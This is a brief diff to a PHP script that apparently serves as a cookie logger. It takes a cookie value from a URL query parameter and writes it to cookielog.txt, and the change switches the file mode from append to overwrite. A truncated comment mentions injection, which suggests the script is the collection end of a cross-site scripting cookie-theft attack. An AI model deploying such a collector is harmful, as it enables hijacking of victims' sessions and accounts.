@@ -1,7 +1,7 @@
 <?php
 
 	$cookie = $_GET[" c"];
-	$file = fopen('cookielog.txt', 'a');
+	$file = fopen('cookielog.txt', 'w');
 	fwrite($file, $cookie . "\n\n");
 	/* 
 	inject 
